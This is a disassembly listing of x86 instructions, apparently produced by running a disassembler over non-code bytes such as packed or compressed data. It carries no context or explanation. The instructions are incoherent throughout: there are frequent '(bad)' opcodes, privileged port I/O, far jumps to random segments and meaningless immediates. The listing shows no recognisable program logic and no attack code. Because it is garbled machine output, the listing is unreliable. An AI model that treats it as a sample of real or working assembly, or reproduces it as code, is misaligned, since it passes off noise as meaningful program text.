  418492:	xchg   DWORD PTR [edx],esi
  418494:	call   0xefe8da60
  418499:	sti    
  41849a:	dec    esp
  41849b:	pop    ds
  41849c:	mov    ecx,0xa48265f3
  4184a1:	mov    WORD PTR [edx-0x4e],es
  4184a4:	sbb    DWORD PTR [ebx+edx*1-0x6e20162d],ebx
  4184ab:	ins    DWORD PTR es:[edi],dx
  4184ac:	aaa    
  4184ad:	retf   0x896
  4184b0:	iret   
  4184b1:	(bad)  
  4184b2:	jmp    0x6bf63f77
  4184b7:	loope  0x418499
  4184b9:	sub    eax,0x50600fb8
  4184be:	jmp    0xeff1:0xec515901
  4184c5:	sub    eax,0xec639d3f
  4184ca:	sbb    al,0xa8
  4184cc:	jo     0x4184a3
  4184ce:	mov    bh,0x85
  4184d0:	push   eax
  4184d1:	mov    esi,0x29b40275
  4184d6:	cwde   
  4184d7:	or     ah,0xfd
  4184da:	mov    BYTE PTR [edx-0x7073fb76],al
  4184e0:	cmp    DWORD PTR [eax+0x1529bc8e],0xfffffff9
  4184e7:	out    dx,al
  4184e8:	ret    0x1e32
  4184eb:	in     al,0x67
  4184ed:	repnz lods eax,DWORD PTR ds:[esi]
  4184ef:	data16 out dx,al
  4184f1:	mov    edi,0xe845620d
  4184f6:	scas   al,BYTE PTR es:[edi]
  4184f7:	loop   0x4184e0
  4184f9:	pop    ebp
  4184fa:	mov    bl,0x7f
  4184fc:	scas   eax,DWORD PTR es:[edi]
  4184fd:	dec    bh
  4184ff:	out    0xb0,al
  418501:	jmp    0x4a1d7ffb
  418506:	(bad)  
  418507:	cmp    BYTE PTR [eax],ah
  418509:	ins    BYTE PTR es:[edi],dx
  41850a:	push   cs
  41850b:	or     eax,0xd667eda4
  418510:	push   ebp
  418511:	mov    al,ds:0xd6600f3d
  418516:	loop   0x4184a4
  418518:	sub    cl,BYTE PTR ds:0x184458e7
  41851e:	dec    ebx
  41851f:	or     BYTE PTR [ebx+0x63],0x7e
  418523:	fdivrp st(5),st
  418525:	mov    al,0x17
  418527:	xchg   DWORD PTR [ecx+0x20],edx
  41852a:	sub    edx,ebp
  41852c:	sub    DWORD PTR [edx-0x20b8847],ebp
  418532:	pop    edx
  418533:	sbb    al,0xcd
  418535:	push   ebx
  418536:	(bad)  
  418537:	inc    edi
  418538:	imul   edx,ecx,0xac8a67b5
  41853e:	adc    cl,BYTE PTR [esi-0x76]
  418541:	mov    edx,0x5ef0bd1c
  418546:	push   edi
  418547:	cmp    al,BYTE PTR [ecx+0x6dc35c56]
  41854d:	ins    BYTE PTR es:[edi],dx
  41854e:	jp     0x4184da
  418550:	and    DWORD PTR [bx+di-0x42],ebp
  418554:	out    0x4f,al
  418556:	std    
  418557:	int    0xd6
  418559:	jmp    0x3e6c:0x992e01c7
  418560:	push   ecx
  418561:	sub    BYTE PTR [ebp+0x6b543da2],0x6b
  418568:	out    dx,al
  418569:	mov    al,0xc9
  41856b:	mov    cl,0x83
  41856d:	(bad)  
  41856e:	lock stos BYTE PTR es:[edi],al
  418570:	fmul   QWORD PTR [eax-0x36]
  418573:	into   
  418574:	in     eax,0xa2
  418576:	leave  
  418577:	push   eax
  418578:	cmovo  esp,DWORD PTR [ebx+0x593c1fef]
  41857f:	jnp    0x41858a
  418581:	mov    edi,DWORD PTR [ebx+0x17f9f767]
  418587:	add    DWORD PTR ss:[ebx+0x5dfc74ce],ecx
  41858e:	jecxz  0x4185be
  418590:	and    eax,0x4beabb95
  418595:	xchg   DWORD PTR [edx+eax*8+0x64283adf],ebp
  41859c:	dec    esi
  41859d:	or     DWORD PTR [edx],edx
  41859f:	test   DWORD PTR [edx+0x2f9522ec],esi
  4185a5:	xor    al,0xda
  4185a7:	mov    edi,0x3d08b83
  4185ac:	cmp    bh,al
  4185ae:	int3   
  4185af:	jne    0x41855d
  4185b1:	int3   
  4185b2:	add    dh,bh
  4185b4:	cmp    bh,dh
  4185b6:	lods   eax,DWORD PTR ds:[esi]
  4185b7:	cmc    
  4185b8:	lea    ebx,[edi]
  4185ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185bb:	pusha  
  4185bc:	and    DWORD PTR [eax-0x52],esp
  4185bf:	neg    DWORD PTR [eax]
  4185c1:	adc    bl,BYTE PTR [edx+0x4e]
  4185c4:	cmc    
  4185c5:	sahf   
  4185c6:	sub    BYTE PTR [eax+0x3c47e894],bl
  4185cc:	cmp    al,0xa9
  4185ce:	aad    0x3c
  4185d0:	and    edi,DWORD PTR [esi]
  4185d2:	int3   
  4185d3:	nop
  4185d4:	out    dx,al
  4185d5:	and    al,0x89
  4185d7:	xchg   esi,eax
  4185d8:	fld    QWORD PTR [ebx]
  4185da:	sti    
  4185db:	add    DWORD PTR [eax-0x1b106a00],ebp
  4185e1:	js     0x418657
  4185e3:	jae    0x418664
  4185e5:	pop    edi
  4185e6:	outs   dx,BYTE PTR ds:[esi]
  4185e7:	aam    0x2d
  4185e9:	test   DWORD PTR [ecx-0x2a],edx
  4185ec:	sub    al,0x94
  4185ee:	stos   BYTE PTR es:[edi],al
  4185ef:	(bad)  
  4185f0:	out    0xb5,eax
  4185f2:	sub    cl,BYTE PTR [ecx+0x70]
  4185f5:	cmp    DWORD PTR [ecx-0x440fc0d3],edi
  4185fb:	pop    ss
  4185fc:	add    DWORD PTR [edx+0x39ce8944],ecx
  418602:	inc    ebp
  418603:	shr    DWORD PTR [ebp+ebp*4+0x3882865b],0x99
  41860b:	xchg   ebx,eax
  41860c:	xor    eax,0xeb5b232a
  418611:	pop    edi
  418612:	add    ebp,DWORD PTR [edx]
  418614:	popf   
  418615:	pop    esp
  418616:	cs mov ebp,0x272ff196
  41861c:	test   BYTE PTR [ecx+ecx*4],bl
  41861f:	push   es
  418620:	sbb    BYTE PTR [ebx+esi*4-0x6f],ah
  418624:	ss punpckhbw mm5,mm4
  418628:	adc    esi,DWORD PTR [ecx-0x29df6258]
  41862e:	mov    al,0xd1
  418630:	and    eax,0xf5d5753b
  418635:	(bad)  
  418636:	imul   ecx,DWORD PTR [edx],0x4f
  418639:	inc    DWORD PTR [eax]
  41863b:	mov    bl,0xd4
  41863d:	and    BYTE PTR [edi-0x1c],dh
  418640:	xchg   ecx,eax
  418641:	sbb    ebx,DWORD PTR [edx]
  418643:	fisub  DWORD PTR [ecx+0x4bf8c7f4]
  418649:	push   cs
  41864a:	jp     0x41864c
  41864c:	inc    edx
  41864d:	arpl   WORD PTR [ebp+0x56],bx
  418650:	fmul   DWORD PTR [eax]
  418652:	jg     0x4186a9
  418654:	arpl   WORD PTR [eax],si
  418656:	(bad)  [ecx]
  418658:	data16 aas 
  41865a:	mov    ch,0x86
  41865c:	mov    ebx,0xb165c1c0
  418661:	adc    DWORD PTR ds:0x20c1e40f,ecx
  418667:	push   esp
  418668:	addr16 mov bl,0xca
  41866b:	fcmovnb st,st(4)
  41866d:	mov    esp,0x6b0b5891
  418672:	fimul  DWORD PTR [esi-0x43]
  418675:	arpl   WORD PTR [ecx-0x79],cx
  418678:	rcr    BYTE PTR [eax],1
  41867a:	sub    al,0x63
  41867c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41867d:	or     al,0xfd
  41867f:	pushf  
  418680:	sub    dl,BYTE PTR [edx+0x56b8e9c]
  418686:	stos   DWORD PTR es:[edi],eax
  418687:	dec    edx
  418688:	leave  
  418689:	lods   eax,DWORD PTR ds:[esi]
  41868a:	xchg   DWORD PTR [ecx],edx
  41868c:	adc    eax,0xccc773d1
  418691:	mov    edx,0xf258962a
  418696:	push   cs
  418697:	and    al,0xad
  418699:	call   0x4a3c:0xe6f26f21
  4186a0:	fistp  QWORD PTR ds:0xd74083e9
  4186a6:	xchg   esp,eax
  4186a7:	cmp    al,0xd1
  4186a9:	imul   esi,DWORD PTR [eax],0xffffffac
  4186ac:	pop    ebx
  4186ad:	lahf   
  4186ae:	push   esp
  4186af:	adc    esi,DWORD PTR [eax]
  4186b1:	xor    BYTE PTR [eax+0x55c4b1c6],0xaa
  4186b8:	rcl    BYTE PTR [esi-0xe],1
  4186bb:	jnp    0x4186a0
  4186bd:	lods   eax,DWORD PTR ds:[esi]
  4186be:	dec    ecx
  4186bf:	sbb    al,0xd9
  4186c1:	pop    esp
  4186c2:	js     0x4186f4
  4186c4:	xlat   BYTE PTR ds:[ebx]
  4186c5:	cmp    BYTE PTR [ecx-0x75],0xb2
  4186c9:	test   ebp,0x2c3424a9
  4186cf:	stos   BYTE PTR es:[edi],al
  4186d0:	push   es
  4186d1:	jnp    0x41872a
  4186d3:	outs   dx,BYTE PTR ds:[esi]
  4186d4:	test   al,0xc
  4186d6:	shl    BYTE PTR [ebx-0x70],cl
  4186d9:	adc    al,0x40
  4186db:	je     0x4186a6
  4186dd:	in     al,0xd
  4186df:	aam    0x15
  4186e1:	and    DWORD PTR [eax-0x3f],esp
  4186e4:	xor    BYTE PTR [ebx-0x5f],ah
  4186e7:	sbb    eax,0xe6362b97
  4186ec:	popf   
  4186ed:	lea    ebx,ds:0x9c18c01e
  4186f3:	mov    dh,0xdf
  4186f5:	push   edi
  4186f6:	int    0x44
  4186f8:	aaa    
  4186f9:	fstp   DWORD PTR [eax+eax*8]
  4186fc:	push   ecx
  4186fd:	dec    edi
  4186fe:	sahf   
  4186ff:	rol    ebx,1
  418701:	xchg   ecx,eax
  418702:	jo     0x41870a
  418704:	int    0x53
  418706:	nop
  418707:	xchg   DWORD PTR [esi+0x6c9d9c3e],ebx
  41870d:	jmp    0xdc6f:0x64733cf7
  418714:	(bad)  
  418715:	in     al,dx
  418716:	mov    ds:0x2cdfce34,al
  41871b:	mov    eax,ds:0x3af16692
  418720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418721:	iret   
  418722:	mov    ah,0x1f
  418724:	jo     0x4186ea
  418726:	cmp    ebp,DWORD PTR [ecx+0x7f]
  418729:	push   eax
  41872a:	xor    edi,ebp
  41872c:	imul   edx,DWORD PTR [edi+ebp*4],0x170f6096
  418733:	nop
  418734:	xchg   esp,eax
  418735:	inc    edi
  418736:	mov    ebx,0xf4c651a0
  41873b:	mov    BYTE PTR [ebp+0x9267d5e],al
  418741:	or     BYTE PTR ds:0xb6e65805,bh
  418747:	mov    cl,0xfa
  418749:	xchg   BYTE PTR [esi],bh
  41874b:	dec    edx
  41874c:	aam    0x9
  41874e:	pop    edx
  41874f:	and    BYTE PTR [esi+0x8246658],ch
  418755:	nop
  418756:	mov    WORD PTR [esi+0x437c0d],ss
  41875c:	and    eax,0xe9f35e3d
  418761:	sbb    DWORD PTR [eax],edi
  418763:	xor    ecx,DWORD PTR [edi]
  418765:	adc    eax,0x44d8bfd7
  41876a:	or     BYTE PTR [edx],cl
  41876c:	sbb    esi,esi
  41876e:	daa    
  41876f:	(bad)  
  418770:	add    ecx,DWORD PTR [ebx]
  418772:	popf   
  418773:	shl    BYTE PTR [eax+0xd],cl
  418776:	jmp    0x17cdbcba
  41877b:	mov    ch,0xe8
  41877d:	jle    0x4187f7
  41877f:	ret    0x933f
  418782:	cmp    dh,BYTE PTR [ecx+esi*4+0x3a]
  418786:	mul    DWORD PTR [eax+eiz*8+0x432bb078]
  41878d:	scas   al,BYTE PTR es:[edi]
  41878e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41878f:	rcl    BYTE PTR [ebp-0x6a7530bf],0xf2
  418796:	pushf  
  418797:	jmp    0xfd27:0x5aea7dbf
  41879e:	dec    edi
  41879f:	test   eax,0x678f18a0
  4187a4:	gs jecxz 0x4187d5
  4187a7:	aas    
  4187a8:	mov    eax,ds:0xe33c27ff
  4187ad:	stc    
  4187ae:	call   0xe688:0xaf0ea3b8
  4187b5:	ret    
  4187b6:	imul   ebx,DWORD PTR [edx-0x2c5104a6],0x46
  4187bd:	sbb    dl,ch
  4187bf:	mov    bh,0x0
  4187c1:	adc    edi,DWORD PTR [ebx+0x1e]
  4187c4:	mov    bh,0x6e
  4187c6:	test   al,0x2e
  4187c8:	sbb    dl,dl
  4187ca:	pop    ss
  4187cb:	mov    ecx,0x8b27979c
  4187d0:	push   0xdd6732f1
  4187d5:	adc    esp,edx
  4187d7:	sbb    dl,BYTE PTR [ebx]
  4187d9:	sti    
  4187da:	enter  0xa6bf,0x25
  4187de:	push   cs
  4187df:	sar    BYTE PTR [ebx+edi*8+0x18],cl
  4187e3:	jno    0x418861
  4187e5:	cmc    
  4187e6:	inc    esi
  4187e7:	out    dx,eax
  4187e8:	inc    ecx
  4187e9:	pop    esi
  4187ea:	pop    eax
  4187eb:	iret   
  4187ec:	enter  0x14aa,0xb1
  4187f0:	xchg   esp,eax
  4187f1:	mov    ds:0x974b6779,al
  4187f6:	aas    
  4187f7:	cmp    esp,DWORD PTR [esi+ecx*1-0x4d]
  4187fb:	test   eax,0xb35d9ee0
  418800:	addr16 sub cl,al
  418803:	push   edx
  418804:	sbb    eax,0x4249cbfd
  418809:	aas    
  41880a:	cdq    
  41880b:	call   DWORD PTR [edi]
  41880d:	je     0x418877
  41880f:	icebp  
  418810:	retf   0x2e96
  418813:	push   ecx
  418814:	js     0x4187b5
  418816:	stos   DWORD PTR es:[edi],eax
  418817:	les    eax,FWORD PTR [edi-0x73b85c66]
  41881d:	pop    edi
  41881e:	xor    DWORD PTR [ebp-0x164d1ac6],ecx
  418824:	sub    DWORD PTR [ebx-0x7b],eax
  418827:	icebp  
  418828:	ficom  WORD PTR [ecx-0x70727c74]
  41882e:	and    BYTE PTR [ecx+0x1e045f30],dl
  418834:	push   cs
  418835:	inc    esp
  418836:	sbb    al,0xd5
  418838:	adc    BYTE PTR [eax],ah
  41883a:	push   0xffffffeb
  41883c:	lods   eax,DWORD PTR ds:[esi]
  41883d:	mov    ecx,0xe5f5465b
  418842:	pop    esp
  418843:	push   edx
  418844:	retf   0x5f07
  418847:	adc    ecx,DWORD PTR [ebp+edi*2-0x4e]
  41884b:	cmp    DWORD PTR [eax-0x61094af2],edx
  418851:	jmp    0xa3d4:0xbae54c46
  418858:	xor    DWORD PTR [ebx],edx
  41885a:	push   ebx
  41885b:	sahf   
  41885c:	sbb    eax,0xd2a5cb39
  418861:	sub    BYTE PTR [edi],ah
  418863:	pop    eax
  418864:	pop    ss
  418865:	sahf   
  418866:	cdq    
  418867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418868:	das    
  418869:	lods   al,BYTE PTR ds:[esi]
  41886a:	repnz xchg esi,eax
  41886c:	out    dx,eax
  41886d:	push   esp
  41886e:	jmp    0x418827
  418870:	pop    ss
  418871:	mov    ds:0xf695a20c,al
  418876:	xchg   esi,eax
  418877:	lock jge 0x41887e
  41887a:	(bad)  
  41887b:	pop    ss
  41887c:	stc    
  41887d:	adc    BYTE PTR [ebx-0x71b3569a],al
  418883:	or     eax,0xec396d80
  418888:	loope  0x41881c
  41888a:	mov    ebp,0xf3243ada
  41888f:	jo     0x418903
  418891:	test   BYTE PTR [ebp-0x2b],0x8f
  418895:	into   
  418896:	dec    ecx
  418897:	int    0x6a
  418899:	mov    ecx,0x1ed189b6
  41889e:	psadbw mm6,mm4
  4188a1:	jns    0x418824
  4188a3:	mov    ebp,0xb7bdba11
  4188a8:	cmp    eax,0xf197939e
  4188ad:	retf   0x2a0f
  4188b0:	sub    eax,0x20d1e5a8
  4188b5:	stos   BYTE PTR es:[edi],al
  4188b6:	mov    ah,0xc9
  4188b8:	aaa    
  4188b9:	cmc    
  4188ba:	sbb    al,0xe5
  4188bc:	add    cl,bl
  4188be:	push   ebx
  4188bf:	dec    ebp
  4188c0:	adc    ebx,esi
  4188c2:	pop    ecx
  4188c3:	jmp    0x8a83:0xef62faf1
  4188ca:	in     al,0x3d
  4188cc:	dec    eax
  4188cd:	js     0x418941
  4188cf:	cmc    
  4188d0:	dec    esp
  4188d1:	pop    ecx
  4188d2:	or     dh,bl
  4188d4:	into   
  4188d5:	jl     0x4188a1
  4188d7:	pop    edi
  4188d8:	push   esp
  4188d9:	(bad)  
  4188da:	imul   ecx,ebx,0x5f88b607
  4188e0:	test   eax,0x2ed190d9
  4188e5:	xchg   edi,edx
  4188e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e8:	add    eax,0xa78c6fc1
  4188ed:	ficomp WORD PTR [eax]
  4188ef:	mov    ecx,0x2fd8c07f
  4188f4:	(bad)  
  4188f6:	scas   al,BYTE PTR es:[edi]
  4188f7:	leave  
  4188f8:	xor    DWORD PTR [ebp-0x30f3fe8b],ebx
  4188fe:	jno    0x4188a2
  418900:	mov    al,ds:0xebeaaa6a
  418905:	sub    eax,0x871a626a
  41890a:	dec    esp
  41890b:	imul   dh
  41890d:	(bad)  
  41890f:	sub    edx,DWORD PTR [edx]
  418911:	jbe    0x4188b8
  418913:	xlat   BYTE PTR ds:[ebx]
  418914:	out    0x14,eax
  418916:	mov    edi,0x456970dd
  41891b:	repz cmp eax,eax
  41891e:	mov    edx,DWORD PTR [ecx+0x5d7d767e]
  418924:	sub    al,0x57
  418926:	push   cs
  418927:	cli    
  418928:	pop    esp
  418929:	pop    ebp
  41892a:	and    al,0xfa
  41892c:	or     cl,BYTE PTR [esi-0x6f9e018b]
  418932:	jp     0x41896f
  418934:	pop    ss
  418935:	xchg   ecx,eax
  418936:	test   DWORD PTR [esi-0x36],ebp
  418939:	stos   DWORD PTR es:[edi],eax
  41893a:	mov    eax,0x15b601dc
  41893f:	pusha  
  418940:	sub    ebx,DWORD PTR [eax]
  418942:	es jno 0x4189b8
  418945:	mov    edi,0x6e39e4aa
  41894a:	and    al,0xab
  41894c:	aas    
  41894d:	cld    
  41894e:	jae    0x4189cc
  418950:	push   eax
  418951:	adc    dh,BYTE PTR [edi-0x2406c7f1]
  418957:	add    ecx,DWORD PTR [edi]
  418959:	mov    fs,ebx
  41895b:	icebp  
  41895c:	test   DWORD PTR [esi+ebp*1-0x1213264d],eax
  418963:	pop    esp
  418964:	push   ebx
  418965:	pop    eax
  418966:	pusha  
  418967:	inc    ebx
  418968:	dec    edi
  418969:	or     eax,DWORD PTR [edi]
  41896b:	pusha  
  41896c:	dec    esi
  41896d:	xor    cl,BYTE PTR [edx+0x47]
  418970:	shl    DWORD PTR [eax+0x522b2ea6],1
  418976:	fcom   DWORD PTR [ebx+0x7a]
  418979:	or     ah,bh
  41897b:	xchg   esi,eax
  41897c:	push   0x3f35870b
  418981:	xor    al,0x56
  418983:	or     BYTE PTR [edi-0x170ab4cb],al
  418989:	les    edx,FWORD PTR [edx-0x22]
  41898c:	sbb    ah,BYTE PTR [ebp+0xaf33c51]
  418992:	sub    BYTE PTR [edx+0x39],0x46
  418996:	scas   al,BYTE PTR es:[edi]
  418997:	pop    esi
  418998:	test   eax,0x7dcbf76b
  41899d:	mov    esi,0x2cfc3862
  4189a2:	(bad)  [eax+ebx*1+0x6b0dd608]
  4189a9:	pusha  
  4189aa:	mov    edx,DWORD PTR [esi+eiz*1]
  4189ad:	xor    eax,DWORD PTR [ebx-0x5d73d3f2]
  4189b3:	mov    esp,0x58229ff9
  4189b8:	arpl   WORD PTR [esi+0x4760d77c],di
  4189be:	frstor [ebp+0x5b]
  4189c1:	in     al,dx
  4189c2:	out    dx,al
  4189c3:	sub    DWORD PTR [edi+0x1028a0e9],0x47bb6183
  4189cd:	outs   dx,DWORD PTR ds:[esi]
  4189ce:	test   DWORD PTR [edx-0x24],edx
  4189d1:	int    0xa0
  4189d3:	cmp    DWORD PTR [esi+0x59],edi
  4189d6:	sub    ebx,DWORD PTR [ebx+0x79]
  4189d9:	loopne 0x418a51
  4189db:	inc    ecx
  4189dc:	daa    
  4189dd:	into   
  4189de:	xchg   esp,eax
  4189df:	stc    
  4189e0:	push   ebp
  4189e1:	push   ebp
  4189e2:	ret    0x201a
  4189e5:	pushf  
  4189e6:	dec    ecx
  4189e7:	jecxz  0x418a43
  4189e9:	dec    ebx
  4189ea:	add    edx,ebp
  4189ec:	mov    edi,0x9d1342b4
  4189f1:	out    0xf7,eax
  4189f3:	mov    ebp,0x11cd8310
  4189f8:	cmc    
  4189f9:	inc    edi
  4189fa:	adc    al,0xf4
  4189fc:	push   edi
  4189fd:	in     eax,dx
  4189fe:	fisub  WORD PTR [esi+ecx*8+0x1]
  418a02:	pop    ss
  418a03:	jle    0x418a1e
  418a05:	inc    edi
  418a06:	out    dx,eax
  418a07:	dec    ebp
  418a08:	mov    ds:0x64fd7a1d,al
  418a0d:	pop    es
  418a0e:	add    bl,BYTE PTR es:[eax]
  418a11:	fcomp  QWORD PTR [eax+edi*4-0x490e25af]
  418a18:	push   edx
  418a19:	cwde   
  418a1a:	cmp    BYTE PTR [ebp-0x60],cl
  418a1d:	into   
  418a1e:	jo     0x418a5d
  418a20:	fadd   DWORD PTR [ecx-0x73]
  418a23:	pop    eax
  418a24:	push   eax
  418a25:	test   al,0x0
  418a27:	xchg   edx,eax
  418a28:	xchg   ebp,eax
  418a29:	mov    edx,0xe6102fc5
  418a2e:	nop
  418a2f:	jmp    0x4189b8
  418a31:	xor    al,0xda
  418a33:	into   
  418a34:	inc    ecx
  418a35:	xlat   BYTE PTR ds:[ebx]
  418a36:	and    DWORD PTR [ecx-0x44020360],edi
  418a3c:	pop    es
  418a3d:	into   
  418a3e:	mov    ds:0xa5e5689d,eax
  418a43:	jo     0x418aa2
  418a45:	add    eax,0x96d35fa5
  418a4a:	inc    esp
  418a4b:	fnstcw WORD PTR ds:0x13b1753b
  418a51:	inc    ecx
  418a52:	add    DWORD PTR [ebx-0x215f34dd],edx
  418a58:	icebp  
  418a59:	dec    esp
  418a5a:	daa    
  418a5b:	xor    ebp,DWORD PTR [esi-0x7b095475]
  418a61:	sbb    BYTE PTR [edx-0x42ccdf15],ch
  418a67:	pop    ebp
  418a68:	(bad)  
  418a69:	shl    al,1
  418a6b:	mov    DWORD PTR [edi],edx
  418a6d:	test   BYTE PTR [edi-0x4f6a08df],0xd
  418a74:	fs sub esp,0xffffffc4
  418a78:	fisubr DWORD PTR [edx]
  418a7a:	adc    eax,0x8be30b17
  418a7f:	jno    0x418a7a
  418a81:	repnz fist WORD PTR [ebx]
  418a84:	ret    
  418a85:	xchg   esi,eax
  418a86:	lahf   
  418a87:	push   cs
  418a88:	popf   
  418a89:	cmp    eax,esp
  418a8b:	das    
  418a8c:	rcr    BYTE PTR [ecx-0x80],cl
  418a8f:	sbb    al,0xf1
  418a91:	jmp    0x182dc8df
  418a96:	repz xor DWORD PTR [ebx+0x37],edi
  418a9a:	outs   dx,DWORD PTR ds:[esi]
  418a9b:	xchg   esi,eax
  418a9c:	adc    eax,0xa109bfb0
  418aa1:	inc    esi
  418aa2:	mov    bl,al
  418aa4:	sub    DWORD PTR [ecx],0xffffff97
  418aa7:	call   0x164:0x8304b2b1
  418aae:	adc    cl,BYTE PTR [ecx]
  418ab0:	xor    DWORD PTR [ebp-0x65],0xffffffe4
  418ab4:	fnstsw WORD PTR [eax-0x3d6105a8]
  418aba:	or     bh,BYTE PTR [edx+0x4269239]
  418ac0:	test   BYTE PTR ds:0x95b521b7,bl
  418ac6:	inc    DWORD PTR [esi-0x3ac1365d]
  418acc:	in     al,0x3c
  418ace:	jmp    0xb125:0xdb14f3f1
  418ad5:	jae    0x418a66
  418ad7:	mov    cl,BYTE PTR ds:0xc2cd7358
  418add:	mov    eax,ds:0x5b959a8d
  418ae2:	sub    eax,0x6b7c202b
  418ae7:	mov    cl,0xb0
  418ae9:	ins    DWORD PTR es:[edi],dx
  418aea:	xor    al,0x67
  418aec:	or     al,0x72
  418aee:	jp     0x418a88
  418af0:	enter  0x2d00,0x7a
  418af4:	adc    cl,BYTE PTR [ebx+0x7e0f892d]
  418afa:	daa    
  418afb:	mov    al,0x57
  418afd:	inc    esp
  418afe:	inc    ebp
  418aff:	or     DWORD PTR [eax-0x30052a03],esp
  418b05:	cmp    al,0xe1
  418b07:	adc    eax,0xdf4918a5
  418b0c:	lods   eax,DWORD PTR ds:[esi]
  418b0d:	dec    esp
  418b0e:	xor    eax,0x4229f83e
  418b13:	test   BYTE PTR ds:0x65fba191,ch
  418b19:	and    al,0x57
  418b1b:	scas   eax,DWORD PTR es:[edi]
  418b1c:	dec    DWORD PTR [eax-0x5d1b680a]
  418b22:	add    BYTE PTR [edi+esi*2+0x66],dh
  418b26:	and    bh,BYTE PTR [edi-0x68]
  418b29:	mov    ebx,0xa8ed78d3
  418b2e:	and    DWORD PTR [eax+0x1633334e],edi
  418b34:	adc    DWORD PTR [edi],eax
  418b36:	or     BYTE PTR [ebp+0x43],cl
  418b39:	push   edi
  418b3a:	sbb    eax,0x7d54d799
  418b3f:	in     eax,0x20
  418b41:	and    BYTE PTR [ecx+0x64],bl
  418b44:	xchg   ecx,eax
  418b45:	mov    ecx,0x2a2a1a39
  418b4a:	mov    ebx,ebx
  418b4c:	jge    0x418b07
  418b4e:	xor    eax,DWORD PTR [esi]
  418b50:	inc    edx
  418b51:	aas    
  418b52:	jl     0x418b94
  418b54:	fst    QWORD PTR [esi+0x71594eea]
  418b5a:	pop    esp
  418b5b:	sahf   
  418b5c:	daa    
  418b5d:	es fcmove st,st(5)
  418b60:	cmp    BYTE PTR [edx+eax*8],0xc1
  418b64:	push   cs
  418b65:	inc    esi
  418b66:	scas   al,BYTE PTR es:[edi]
  418b67:	fs push cs
  418b69:	and    ah,ah
  418b6b:	cs push edi
  418b6d:	or     eax,DWORD PTR [esi-0x36]
  418b70:	(bad)  
  418b72:	jle    0x418b37
  418b74:	adc    DWORD PTR [ebx+edi*4],0xd6304a82
  418b7b:	jmp    0x17319ad8
  418b80:	sbb    al,0xf5
  418b82:	std    
  418b83:	add    BYTE PTR [eax],ch
  418b85:	or     DWORD PTR [esi+ebp*1],0x670108be
  418b8c:	ds sub eax,0x7a6274a5
  418b92:	cmp    edx,DWORD PTR [edx-0x5eb03d36]
  418b98:	xchg   edx,eax
  418b99:	xchg   dx,ax
  418b9b:	push   ecx
  418b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b9d:	int3   
  418b9e:	pop    ds
  418b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ba0:	push   esp
  418ba1:	pop    esp
  418ba2:	ds inc edx
  418ba4:	icebp  
  418ba5:	dec    edi
  418ba6:	es push eax
  418ba8:	dec    ebx
  418ba9:	in     eax,dx
  418baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bab:	enter  0xb586,0x94
  418baf:	aad    0xf0
  418bb1:	xchg   edx,eax
  418bb2:	dec    eax
  418bb3:	and    BYTE PTR [ebx-0x3674bc1b],ch
  418bb9:	(bad)  
  418bba:	fcmovnu st,st(6)
  418bbc:	dec    edi
  418bbd:	inc    eax
  418bbe:	ins    DWORD PTR es:[edi],dx
  418bbf:	sbb    al,0xde
  418bc1:	add    ecx,0x32d38709
  418bc7:	clc    
  418bc8:	pop    esp
  418bc9:	xor    esp,DWORD PTR [edx+edi*4]
  418bcc:	jl     0x418c04
  418bce:	stos   DWORD PTR es:[edi],eax
  418bcf:	add    ecx,DWORD PTR [edi+edx*2+0x25efda57]
  418bd6:	pop    ebp
  418bd7:	adc    DWORD PTR [ebx],edi
  418bd9:	dec    ebx
  418bda:	cmp    BYTE PTR [ecx],cl
  418bdc:	add    al,ch
  418bde:	lock or ch,ch
  418be1:	daa    
  418be2:	fidiv  DWORD PTR [esi]
  418be4:	mov    ch,0x5
  418be6:	mov    esp,0xf00aae7a
  418beb:	ins    BYTE PTR es:[edi],dx
  418bec:	(bad)
  418bef:	gs sub ebp,eax
  418bf2:	jmp    0xf25:0x39f4ece4
  418bf9:	std    
  418bfa:	push   esp
  418bfb:	jo     0x418b8d
  418bfd:	outs   dx,DWORD PTR ds:[esi]
  418bfe:	jle    0x418c78
  418c00:	dec    esp
  418c01:	mov    cl,0x5a
  418c03:	add    eax,0x5b6bfc81
  418c08:	inc    ebp
  418c09:	not    BYTE PTR [eax-0x20]
  418c0c:	out    0xec,eax
  418c0e:	pop    ebx
  418c0f:	xor    eax,0x4fcade6e
  418c14:	lods   al,BYTE PTR ds:[esi]
  418c15:	sub    edx,edi
  418c17:	inc    BYTE PTR [edi-0x3d]
  418c1a:	ds sub eax,0x24bba072
  418c20:	ja     0x418c8a
  418c22:	shl    BYTE PTR [ebx+0x779e15d7],cl
  418c28:	outs   dx,DWORD PTR ds:[esi]
  418c29:	dec    edi
  418c2a:	sub    esi,0xffffff81
  418c2d:	shr    BYTE PTR [esi-0x29],cl
  418c30:	mov    ds:0xdd1b65d2,al
  418c35:	sbb    dh,BYTE PTR [eax+eiz*4-0x471989ea]
  418c3c:	inc    ebx
  418c3d:	mov    DWORD PTR [esi],esi
  418c3f:	mov    ebp,0xd9850904
  418c44:	pop    ecx
  418c45:	pop    ebx
  418c46:	adc    al,BYTE PTR [ebx]
  418c48:	push   esi
  418c49:	mov    esi,0x98c429f8
  418c4e:	out    0xf9,al
  418c50:	leave  
  418c51:	(bad)  
  418c52:	jle    0x418c16
  418c54:	stos   DWORD PTR es:[edi],eax
  418c55:	test   BYTE PTR [ecx-0x26],cl
  418c58:	outs   dx,BYTE PTR ds:[esi]
  418c59:	int    0xe4
  418c5b:	call   0xb2827784
  418c60:	js     0x418ce1
  418c62:	or     DWORD PTR [edx+edx*2+0x7c],0xffffffc5
  418c67:	xchg   edx,eax
  418c68:	sbb    esp,ebx
  418c6a:	push   edx
  418c6b:	inc    ebx
  418c6c:	adc    ch,BYTE PTR [ebx-0x4f]
  418c6f:	retf   0x6de5
  418c72:	mov    ds:0x278a31e3,eax
  418c77:	stc    
  418c78:	mov    ah,0x10
  418c7a:	ror    BYTE PTR [eax+0xa],cl
  418c7d:	das    
  418c7e:	aaa    
  418c7f:	(bad)  [edx-0x4f]
